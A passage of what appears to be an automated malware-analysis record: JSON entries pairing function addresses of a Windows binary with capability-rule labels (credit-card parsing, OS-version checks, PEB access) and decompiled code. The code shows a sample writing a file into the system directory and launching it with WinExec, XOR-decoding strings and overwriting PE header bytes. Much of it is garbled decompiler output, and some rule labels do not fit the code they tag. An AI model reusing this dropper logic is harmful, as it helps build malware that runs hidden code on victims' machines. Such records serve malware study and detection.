*arg_ch;\n        if (in_ECX >> 0x10 != 0) {\n            in_ECX = (in_ECX >> 0x10) + (in_ECX & 0xffff);\n        }\n        arg_ch = arg_ch + 1;\n        arg_10h = arg_10h + -1;\n    } while (arg_10h != NULL);\ncode_r0x00403fc3:\n    return (in_ECX >> 0x10) + in_ECX;\n}\n",
        "token_count": 651
    },
    "00404130": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00404130(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00401220(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 52
    },
    "00401830": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401873) overlaps instruction at (ram,0x00401871)\n// \n// WARNING: Removing unreachable block (ram,0x0040185e)\n// WARNING: Removing unreachable block (ram,0x00401864)\n// WARNING: Removing unreachable block (ram,0x00401865)\n// WARNING: Removing unreachable block (ram,0x0040186d)\n\nbool fcn.00401830(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar uStack276;\n    uint uStack275;\n    uchar *puStack16;\n    uint uStack8;\n    \n    uStack276 = 0;\n    uStack8 = 0x104;\n    puVar2 = &uStack275;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)();\n    if (iVar1 != 0) {\n        return false;\n    }\n    puStack16 = (*_sym.imp.MSVCRT.dll_strchr)(&uStack276, 0x2e);\n    if (puStack16 == NULL) {\n        return false;\n    }\n    *puStack16 = 0;\n    iVar1 = (*_sym.imp.MSVCRT.dll_atoi)(&uStack276);\n    if (iVar1 != 6) {\n        return iVar1 == 7;\n    }\n    return true;\n}\n",
        "token_count": 373
    },
    "004015a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.004015a0(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00404040;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x411190;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 217
    },
    "00403770": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00403842)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403770(int16_t *arg_8h)\n\n{\n    uint32_t *in_EAX;\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint var_10ch;\n    uint32_t uStackY56;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    if (0x7 < &stack0xfffffffc) {\n        if (0x7 >= &stack0xfffffffc) {\n            if (*in_EAX <= &stack0xffffffe8 && in_EAX != 0xffffffff) {\n                fcn.00404b40(&var_10ch, 0xffffffff);\n                return 1;\n            }\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    if (*arg_8h != 0x5a4d) {\n        return 0;\n    }\n    if (*(*(arg_8h + 0x1e) + arg_8h) != 0x4550) {\n        return 0;\n    }\n    if ((*(arg_8h + 0x1e) + arg_8h)[0x16] == 0) {\n        var_4h = 0x40;\n        if (*(arg_8h + 0x1e) < 0x81) {\n            return 0;\n        }\n        if (*(arg_8h + 0x1e) < 0xc0) {\n            var_4h = *(arg_8h + 0x1e) - 0x80;\n        }\n        uStackY56 = var_4h;\n        puVar1 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_();\n        if (puVar1 != NULL) {\n            uVar3 = 0;\n            if (var_4h != 0) {\n                do {\n                    iVar2 = (*_sym.imp.MSVCRT.dll_rand)();\n                    uVar4 = uVar3 + 1;\n                    *(uVar3 + puVar1) = iVar2 % 0xff;\n                    uVar3 = uVar4;\n                } while (uVar4 < var_4h);\n            }\n            puVar5 = arg_8h + 0x40;\n            for (uVar3 = var_4h >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {\n                *puVar5 = *puVar1;\n                puVar1 = puVar1 + 1;\n                puVar5 = puVar5 + 1;\n            }\n            for (var_4h = var_4h & 3; var_4h != 0; var_4h = var_4h - 1) {\n                *puVar5 = *puVar1;\n                puVar1 = puVar1 + 1;\n                puVar5 = puVar5 + 1;\n            }\n            sub.MSVCRT.dll_void___cdecl_operator_delete_void__();\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 742
    },
    "00402220": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00402220(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_8h = 0;\n    if (0 < arg_14h) {\n        do {\n            *(var_8h + arg_10h) = arg_14h ^ *(var_8h + arg_10h) ^ *(var_8h % arg_ch + arg_8h);\n            var_8h = var_8h + 1;\n        } while (var_8h < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 190
    },
    "004032d0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004032d0(uint filename, uint mode, uint ptr, uint nitems)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)(filename, mode);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.MSVCRT.dll_fwrite)(ptr, 1, nitems, iVar1);\n    (*_sym.imp.MSVCRT.dll_fflush)(iVar1);\n    (*_sym.imp.MSVCRT.dll_fclose)(iVar1);\n    return 1;\n}\n",
        "token_count": 132
    },
    "00402bc0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402eff) overlaps instruction at (ram,0x00402efe)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.00402bc0(void)\n\n{\n    char *pcVar1;\n    uint32_t *puVar2;\n    int32_t *piVar3;\n    code *pcVar4;\n    uint8_t uVar5;\n    ushort uVar6;\n    uint16_t uVar7;\n    uint uVar8;\n    uint32_t uVar9;\n    char extraout_CH;\n    int32_t extraout_ECX;\n    uint extraout_ECX_00;\n    int32_t extraout_ECX_01;\n    uint16_t extraout_DX;\n    ushort extraout_DX_00;\n    uint extraout_EDX;\n    uint extraout_EDX_00;\n    uint32_t unaff_EBX;\n    uint32_t uVar10;\n    int32_t *piVar11;\n    int32_t *piVar12;\n    uint *puVar13;\n    uint *puVar14;\n    uint *puVar15;\n    int16_t iVar16;\n    uint *unaff_ESI;\n    int32_t iVar17;\n    uint *unaff_EDI;\n    uint8_t *puVar18;\n    uint8_t *puVar19;\n    bool bVar20;\n    uchar uVar21;\n    uchar in_PF;\n    uint8_t in_AF;\n    bool bVar22;\n    char cVar23;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    char cVar24;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    ulong uVar25;\n    unkbyte6 Var26;\n    uint32_t in_stack_00000010;\n    uint in_stack_ffffffdc;\n    \n    fcn.00402220(0x423194, 0x18, 0x4231ac, 0x11);\n    if ((in_PF) || (!in_PF)) {\n        puVar15 = 0xf;\n        in_stack_ffffffdc = 0x4233c8;\n    }\n    else {\n        unaff_ESI = 0x34a96cf4;\n        puVar15 = unaff_EDI;\n    }\n    fcn.00402220(0x423194, 0x18, in_stack_ffffffdc, puVar15);\n    fcn.00402220(0x423194, 0x18, 0x4233d8, 0x1a);\n    uVar7 = unaff_EBX & 0xff00 | unaff_EBX - 0x12;\n    bVar20 = uVar7 < extraout_DX;\n    bVar22 = uVar7 == extraout_DX;\n    uVar25 = fcn.00402220(0x423194, 0x18, 0x42342c, 10);\n    puVar15 = uVar25;\n    if (!bVar20 && !bVar22) {\n        unaff_EBX = unaff_EBX & 0xffff00ff;\n    }\n    *unaff_EDI = *unaff_ESI;\n    pcVar1 = (uVar25 >> 0x20) + 0x18;\n    *pcVar1 = *pcVar1 + extraout_CH;\n    puVar15[-1] = 0x423194;\n    puVar15[-2] = 0x402c90;\n    fcn.00402220(puVar15[-1], *puVar15, puVar15[1], puVar15[2]);\n    puVar15[6] = unaff_EBX & 0xffff0000 | CONCAT11(0xdf, unaff_EBX);\n    puVar15[5] = unaff_ESI + 1;\n    *(puVar15 + 0x12) = extraout_DX_00;\n    iVar17 = puVar15[5];\n    uVar10 = puVar15[6];\n    puVar15[6] = 8;\n    puVar15[5] = 0x423444;\n    puVar15[4] = 0x18;\n    puVar15[3] = 0x423194;\n    puVar15[2] = 0x402cc4;\n    fcn.00402220(puVar15[3], puVar15[4], puVar15[5], puVar15[6]);\n    puVar15[2] = 9;\n    puVar15[1] = 0x42344c;\n    *puVar15 = 0x18;\n    puVar15[-1] = 0x423194;\n    puVar15[-2] = 0x402ce5;\n    uVar8 = fcn.00402220(puVar15[-1], *puVar15, puVar15[1], puVar15[2]);\n    puVar15[6] = uVar8;\n    puVar15[6] = 9;\n    puVar15[5] = 0x423458;\n    puVar15 = puVar15 + 5;\n    while( true ) {\n        puVar15[-1] = 0x18;\n        puVar15[-2] = 0x423194;\n        puVar15[-3] = 0x402d06;\n        fcn.00402220(puVar15[-2], puVar15[-1], *puVar15, puVar15[1]);\n        puVar15[1] = extraout_EDX;\n        puVar15[1] = 9;\n        *puVar15 = 0x423464;\n        puVar15[-1] = 0x18;\n        puVar15[-2] = 0x423194;\n        puVar15[-3] = 0x402d37;\n        uVar6 = fcn.00402220(puVar15[-2], puVar15[-1], *puVar15, puVar15[1]);\n        puVar15[1] = uVar10;\n        *(puVar15 + 2) = uVar6;\n        uVar21 = 0;\n        cVar24 = '\\0';\n        cVar23 = '\\0';\n        bVar20 = false;\n        uVar10 = puVar15[1];\n        puVar15[1] = 0xc;\n        *puVar15 = 0x423470;\n        puVar15[-1] = 0x18;\n        puVar15[-2] = 0x423194;\n        puVar15[-3] = 0x402d6c;\n        uVar5 = fcn.00402220(puVar15[-2], puVar15[-1], *puVar15, puVar15[1]);\n        if ((bVar20 || cVar24 != cVar23) || (!bVar20 && cVar24 == cVar23)) break;\n        in_AF = 9 < (uVar5 & 0xf) | in_AF;\n        puVar15 = puVar15 + -2;\n        if (extraout_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    puVar15[-3] = 3;\n    puVar15[-4] = 0x42347c;\n    puVar15[-5] = 0x18;\n    puVar15[-6] = 0x423194;\n    puVar15[-7] = 0x402d91;\n    uVar9 = fcn.00402220(puVar15[-6], puVar15[-5], puVar15[-4], puVar15[-3]);\n    if ((!bVar20) && (bVar20)) {\n        uVar10 = uVar10 + 1;\n        if (uVar21 || uVar10 == 0) {\n            puVar2 = (in_stack_00000010 | 0x6ae181d0) + 0x6a;\n            *puVar2 = *puVar2 & uVar10;\n            pcVar4 = swi(3);\n            (*pcVar4)();\n            return;\n        }\n        in_AF = 9 < (uVar9 & 0xf) | in_AF;\n        piVar12 = (uVar9 & 0xffff0000 | CONCAT11((uVar9 >> 8) + in_AF, uVar9 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar12 = *piVar12 - uVar10;\n        iVar17 = iVar17 + 1;\n    }\n    puVar15[-7] = 10;\n    puVar15[-8] = 0x423480;\n    puVar15[-9] = 0x18;\n    puVar15[-10] = 0x423194;\n    puVar15[-0xb] = 0x402db8;\n    Var26 = fcn.00402220(puVar15[-10], puVar15[-9], puVar15[-8], puVar15[-7]);\n    puVar15[1] = Var26;\n    *(puVar15 + 2) = Var26 >> 0x20;\n    bVar20 = SCARRY4(Var26, 1);\n    puVar15[1] = 0x40;\n    *puVar15 = 0x42348c;\n    puVar15[-1] = 0x18;\n    piVar11 = puVar15 + -2;\n    puVar15[-2] = 0x423194;\n    puVar15[-3] = 0x402dd5;\n    fcn.00402220(puVar15[-2], puVar15[-1], *puVar15, puVar15[1]);\n    if ((bVar20) || (!bVar20)) {\n        piVar11 = puVar15 + -3;\n        puVar15[-3] = 0xc;\n    }\n    piVar11[-1] = 0x4234cc;\n    piVar11[-2] = 0x18;\n    piVar11[-3] = 0x423194;\n    piVar11[-4] = 0x402dff;\n    uVar25 = fcn.00402220(piVar11[-3], piVar11[-2], piVar11[-1], *piVar11);\n    piVar11[4] = uVar25;\n    piVar11[3] = extraout_ECX_00;\n    piVar11[2] = uVar25 >> 0x20;\n    piVar11[1] = uVar10;\n    *piVar11 = piVar11 + 5;\n    piVar11[-1] = in_stack_00000010 | 0x6ae181d0;\n    piVar11[-2] = iVar17;\n    piVar11[-3] = unaff_EDI + 1;\n    puVar18 = piVar11[-3];\n    iVar16 = piVar11[-2];\n    puVar15 = piVar11[-1];\n    iVar17 = piVar11[1];\n    piVar11[4] = 0xb;\n    piVar11[3] = 0x4234d8;\n    piVar11[2] = 0x18;\n    piVar11[1] = 0x423194;\n    *piVar11 = 0x402e1c;\n    uVar7 = fcn.00402220(piVar11[1], piVar11[2], piVar11[3], piVar11[4]);\n    piVar11[4] = extraout_EDX_00;\n    uVar7 = (extraout_EDX_00 & 0xff00 | (extraout_EDX_00 & 0x4e | 0x38) & uVar7) & uVar7 ^ 0x3c00;\n    uVar5 = iVar17 >> 8;\n    uVar10 = (uVar7 & 0xff | (uVar7 >> 8) + uVar5 << 8) | 0x604;\n    bVar20 = (uVar10 >> 8) + uVar10 == '\\0';\n    piVar11[4] = 4;\n    piVar11[3] = 0x4234e4;\n    piVar11[2] = 0x18;\n    piVar11[1] = 0x423194;\n    *piVar11 = 0x402e4d;\n    fcn.00402220(piVar11[1], piVar11[2], piVar11[3], piVar11[4]);\n    piVar12 = piVar11 + 1;\n    if ((!bVar20) && (piVar12 = piVar11 + 1,  bVar20)) {\n        *piVar11 = puVar15;\n        cVar23 = '\\x10';\n        piVar12 = piVar11;\n        do {\n            puVar15 = puVar15 + -1;\n            piVar12 = piVar12 + -1;\n            *piVar12 = *puVar15;\n            cVar23 = cVar23 + -1;\n        } while ('\\0' < cVar23);\n        piVar11[-0x11] = piVar11;\n        piVar12 = piVar11 + -0x5e5f;\n    }\n    piVar12[-1] = 4;\n    piVar12[-2] = 0x4234e8;\n    piVar12[-3] = 0x18;\n    piVar12[-4] = 0x423194;\n    piVar12[-5] = 0x402e6f;\n    Var26 = fcn.00402220(piVar12[-4], piVar12[-3], piVar12[-2], piVar12[-1]);\n    piVar12[3] = Var26;\n    *(piVar12 + 10) = Var26 >> 0x20;\n    uVar10 = ((Var26 & 0xff00 | Var26 & uVar5) ^ 0x6200) - 0x3488 & 0x7ee5;\n    bVar20 = CARRY4(uVar10, uVar10);\n    bVar22 = uVar10 == 0;\n    piVar12[3] = 0xc;\n    piVar12[2] = 0x4234ec;\n    piVar12[1] = 0x18;\n    *piVar12 = 0x423194;\n    piVar12[-1] = 0x402ea2;\n    uVar10 = fcn.00402220(*piVar12, piVar12[1], piVar12[2], piVar12[3]);\n    if ((!bVar22) && (bVar22)) {\n        iVar17 = iVar17 + 1;\n        uVar5 = uVar10;\n        if (bVar20 || iVar17 == 0) {\n            *(extraout_ECX_01 + 0x166a8d4b) = (*(extraout_ECX_01 + 0x166a8d4b) - uVar5) - bVar20;\n            goto code_r0x00402f01;\n        }\n        in_AF = 9 < (uVar5 & 0xf) | in_AF;\n        piVar3 = (uVar10 & 0xffff0000 | CONCAT11((uVar10 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar3 = *piVar3 - iVar17;\n        iVar16 = iVar16 + 1;\n    }\n    piVar12[-1] = 4;\n    piVar12[-2] = 0x4234f8;\n    piVar12[-3] = 0x18;\n    piVar12[-4] = 0x423194;\n    piVar12[-5] = 0x402ec9;\n    uVar25 = fcn.00402220(piVar12[-4], piVar12[-3], piVar12[-2], piVar12[-1]);\n    piVar12[3] = uVar25;\n    piVar12[2] = uVar25 >> 0x20;\n    piVar12[1] = puVar18;\n    bVar20 = CARRY1(uVar25 >> 0x20, uVar25 >> 0x28);\n    puVar18 = piVar12[1];\n    piVar12[3] = 9;\n    piVar12[2] = 0x4234fc;\n    piVar12[1] = 0x18;\n    *piVar12 = 0x423194;\n    piVar12[-1] = 0x402ee7;\n    uVar5 = fcn.00402220(*piVar12, piVar12[1], piVar12[2], piVar12[3]);\n    if (!bVar20) {\n        *(piVar12 + -2) = puVar18;\n        puVar19 = puVar18 & 0xffff0000 | *(piVar12 + -2);\n        puVar18 = puVar19;\n        if (bVar20) {\n            puVar18 = puVar19 + 1;\n            cVar23 = uVar5 - *puVar19;\n            piVar12[-1] = (in_NT & 1) * 0x4000 | SBORROW1(uVar5, *puVar19) * 0x800 | (in_IF & 1) * 0x200 |\n                          (in_TF & 1) * 0x100 | (cVar23 < '\\0') * 0x80 | (cVar23 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                          ((POPCOUNT(cVar23) & 1U) == 0) * 4 | uVar5 < *puVar19 | (in_ID & 1) * 0x200000 |\n                          (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n            iVar16 = iVar16 + -1;\n            puVar13 = piVar12 + -2;\n            piVar12 = piVar12 + -2;\n            *puVar13 = 0x402ef9;\n            func_0x10188e71();\n            goto code_r0x00402f01;\n        }\n    }\n    puVar14 = piVar12 + -1;\n    piVar12 = piVar12 + -1;\n    *puVar14 = 0x16;\ncode_r0x00402f01:\n    piVar12[-1] = 0x423508;\n    piVar12[-2] = 0x18;\n    piVar12[-3] = 0x423194;\n    piVar12[-4] = 0x402f12;\n    fcn.00402220(piVar12[-3], piVar12[-2], piVar12[-1], *piVar12);\n    *(piVar12 + 0x12) = iVar17;\n    *(piVar12 + 4) = iVar16;\n    piVar12[3] = puVar18;\n    piVar12[4] = 7;\n    piVar12[3] = 0x423520;\n    piVar12[2] = 0x18;\n    piVar12[1] = 0x423194;\n    *piVar12 = 0x402f3b;\n    fcn.00402220(piVar12[1], piVar12[2], piVar12[3], piVar12[4]);\n    return;\n}\n",
        "token_count": 4392
    },
    "00403bf0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403d5e) overlaps instruction at (ram,0x00403d5a)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING (jumptable): Unable to track spacebase fully for stack\n\nuint fcn.00403bf0(uint *param_1, int32_t param_2, uchar param_3)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    uint *puVar7;\n    uint *puVar8;\n    bool bVar9;\n    uint8_t in_AF;\n    bool bVar10;\n    unkbyte10 extraout_ST0;\n    ulong uVar11;\n    uint uStack535;\n    uchar uStack276;\n    uint uStack275;\n    uint32_t uStack16;\n    \n    puVar7 = &uStack535;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack276 = 0;\n    puVar7 = &uStack275;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack16 = 1;\n    puVar8 = puVar7 + 3;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(0xec);\n    fcn.00401000();\n    iVar5 = fcn.00404510(param_1, param_2, param_3);\n    if (iVar5 == 0) {\n        return 0;\n    }\n    uVar11 = fcn.004016c0();\n    piVar6 = uVar11 >> 0x20;\n    iVar5 = uVar11;\n    if (iVar5 == 0) {\n        return 0;\n    }\n    if ((-1 < iVar5) && (-1 >= iVar5)) {\n        *(iVar5 + -0x7ce92414) = extraout_ST0;\n        uVar1 = uVar11 - 1;\n        in_AF = 9 < (uVar1 & 0xf) | in_AF;\n        uVar1 = uVar1 + in_AF * '\\x06';\n        *piVar6 = *piVar6 + -0x4217207c;\n        out(0xff, uVar1 + (0x90 < (uVar1 & 0xf0) | in_AF * (0xf9 < uVar1)) * '`');\n    // WARNING: Could not recover jumptable at 0x00403d62. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar2 = (**(param_1 + 0x57))();\n        return uVar2;\n    }\n    fcn.00402420();\n    iVar5 = fcn.00404430(0x423204);\n    if (iVar5 == -1) {\n        iVar5 = fcn.00404430(0x4231f8);\n        if (iVar5 != -1) {\n            puVar8 = 0xf;\n            goto code_r0x00403da8;\n        }\n    }\n    else {\n        puVar8 = 0xe;\ncode_r0x00403da8:\n        iVar5 = fcn.00404130(param_1);\n        if (iVar5 != 0) {\n            fcn.004041f0();\n            fcn.00403360();\n            return 1;\n        }\n        if (*0x423658 == 0) {\n            return 0;\n        }\n    }\n    uVar3 = fcn.00404880(param_1, &uStack276);\n    uVar4 = uVar3;\n    if ((uVar3 != 0) && (uVar4 = uStack16,  uVar3 == 0)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    uStack16 = uVar4;\n    bVar9 = (POPCOUNT(uStack16 & 0xff) & 1U) == 0;\n    if (uStack16 != 0) {\n        uVar4 = fcn.00403270(param_1);\n        bVar9 = (POPCOUNT(uVar4 & 0xff) & 1U) == 0;\n        if (uVar4 == 0) {\n            uStack16 = uVar4;\n        }\n    }\n    if ((bVar9) || (!bVar9)) {\n        bVar9 = false;\n        bVar10 = uStack16 == 0;\n        if (!bVar10) goto code_r0x00403e66;\n    }\n    else {\n        *(param_2 + -0x3f7a0bbb) = *(param_2 + -0x3f7a0bbb) | 0x75;\n    }\n    uStack16 = fcn.00401220(param_1, 0);\n    bVar9 = 0xfffffff7 < &stack0xfffffdc8;\n    bVar10 = *0x10 == 0x230;\ncode_r0x00403e66:\n    if ((!bVar9 && !bVar10) && (bVar9 || bVar10)) {\n        *puVar8 = *param_1;\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    if (uStack16 != 0) {\n        fcn.00403360();\n    }\n    (*_sym.imp.KERNEL32.dll_Sleep)();\n    (*_sym.imp.KERNEL32.dll_WinExec)(0x18);\n    return *((&stack0xfffffffc & 0xffff0000 | *0x10 - 4) - 0xc);\n}\n",
        "token_count": 1387
    },
    "00404220": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00404220(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x42365c == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.004022d0(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x423480, acStack1304, &uStack2112);\n    uStack2088 = 0x423508;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x423520;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.004032d0(auStack1564, 0x42347c, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
